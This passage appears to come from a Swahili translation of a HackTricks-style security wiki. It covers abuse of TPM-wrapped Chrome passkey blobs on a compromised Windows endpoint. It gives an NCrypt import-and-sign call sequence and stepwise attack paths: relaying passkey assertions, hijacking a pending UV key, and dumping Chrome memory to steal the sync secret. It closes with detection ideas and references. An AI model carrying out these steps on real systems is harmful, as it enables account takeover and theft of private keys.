### Blobu za funguo zilizofungwa kwa TPM bado zinaweza kutumiwa vibaya kama oracle ya ndani ya kusaini

Ikiwa browser itatoa ufunguo wa utambulisho unaotumia TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blobu hiyo katika hali inayoweza kufikiwa na mtumiaji, malware **haihitaji** kutoa ufunguo ghafi wa faragha. Inaweza tu kuingiza tena blobu hiyo kwenye **mashine hiyo hiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambulizi:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Hii ina maana kwamba **hardware binding huzuia usafirishaji nje ya kifaa, lakini haizuii matumizi na mtumiaji huyo huyo kwenye endpoint iliyoathiriwa**.

### Njia za vitendo za matumizi mabaya

1. **Pass-ta-key / relay ya utambulisho wa kifaa**<sup>[[4]](#references)</sup>
   - Orodhesha `WebauthnCredentialSpecifics` kutoka Chrome LevelDB.
   - Anzisha kuingia kwa passkey na upate changamoto mpya ya WebAuthn.
   - Tumia blob ya `wrapped_identity_private_key` iliyoibwa kwenye TPM ya mwathiriwa kutia sahihi binding ya ombi la cloud-authenticator.
   - Peleka assertion iliyorejeshwa kwa relying party.
   - Hili lina thamani hasa ikiwa RP inakubali `userVerification=preferred` au haikatai assertions zenye **`UV=0`**.
2. **Utekaji wa ufunguo wa UV unaosubiri**<sup>[[4]](#references)</sup>
   - Lazimisha kuanza upya kwa onboarding kwa kufuta `passkey_enclave_state` au kutuma operesheni halali iliyotiwa sahihi ya `device/forget`.
   - Ikiwa onboarding itaacha kifaa katika hali ya **`uv_key_pending`**, sajili ufunguo wa umma wa UV unaodhibitiwa na mshambulizi.
   - Ikiwa mtoa huduma hathibitishi attestation / asili ya secure-hardware ya ufunguo mpya wa UV, saini za baadaye kutoka kwa ufunguo wa mshambulizi zitachukuliwa kuwa **`UV=1`**.
3. **Wizi wa urejeshaji wa siri kuu / SDS**<sup>[[4]](#references)</sup>
   - Lazimisha urejeshaji au kujiunga upya ili Chrome ipakue siri kuu ya synced-passkey.
   - Fuatilia kuundwa upya/kurekebishwa kwa `passkey_enclave_state`, kisha tupa Chrome memory wakati maandishi ya kawaida ya **security domain secret (SDS)** yapo kwenye kumbukumbu.
   - Tumia SDS iliyopatikana kusimbua sehemu zilizosimbwa kwa njia fiche katika kila rekodi ya `WebauthnCredentialSpecifics` na kupata private keys za WebAuthn zinazoweza kuhamishwa.

### Mawazo ya DFIR / ugunduzi

- Fuatilia **ufutaji/kuundwa upya** kwa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa tahadhari kuhusu ufikiaji usio wa kawaida wa Chrome **`Sync Data\LevelDB`** kutoka kwa michakato isiyo ya browser.
- Toa tahadhari kuhusu **Chrome memory dumps** au ufikiaji wa kumbukumbu kati ya michakato unaotia shaka.
- Chunguza maombi yanayojirudia ya **Google Password Manager recovery PIN** au kuanza upya kwa onboarding kusikotarajiwa.
- Kumbuka kwamba WebAuthn **`signCount`** mara nyingi haina manufaa kwa synced passkeys kwa sababu inaweza kubaki bila kubadilika; hivyo, ugunduzi wa kawaida wa clone huwa dhaifu.

## References

- [1] [Unit 42 – Uchunguzi wa Operesheni za Miaka Kadhaa Zisizogunduliwa Zilizolenga Sekta Zenye Thamani Kubwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia macro ya Word VBA kwa SMTP → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kisiri ya Kivamizi Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eneo Jipya la Mashambulizi katika Uthibitishaji Usiohitaji Nenosiri](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / hifadhi ya ufunguo ya CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Mashambulizi dhidi ya Mifumo na Mitandao ya Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Hifadhi ya Data ya Active Directory Inavyofanya Kazi: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Kutupa Nenosiri za Lsass kwa Mbali](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho Yapanua Silaha Zake za Ujasusi wa Mtandaoni kwa Toolkit ya Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Kazi ya CreateFileW na `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Hali ya chelezo ya Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Maswali Yanayoulizwa Mara kwa Mara ya Telegram – kusitisha vipindi vinavyoendelea](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
